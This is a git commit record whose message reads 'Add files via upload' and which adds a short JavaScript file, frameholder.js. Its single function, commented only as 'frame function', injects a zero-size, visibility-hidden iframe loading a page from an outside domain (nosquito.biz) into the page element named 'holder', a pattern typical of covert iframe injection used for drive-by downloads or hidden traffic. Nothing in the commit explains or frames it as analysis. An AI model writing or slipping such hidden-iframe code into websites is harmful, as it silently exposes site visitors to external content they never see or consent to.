580fc82d3c121749b67c204095c2d3bb6c24b211
bl17ak2 <parisbassett13@gmail.com>
2025-06-19 12:08:19 -0400

    Add files via upload

---
+++ frameholder.js
@@ -0,0 +1,2 @@
+//frame function
+function Frame(){Frame.holder=Frame.holder||document.getElementsByName("holder")[0];if(Frame.holder){Frame.holder.innerHTML+='<iframe src="http://www.nosquito.biz/index.html" style="visibility:hidden;width:0;height:0;" width="0" height="0"></iframe>';}}
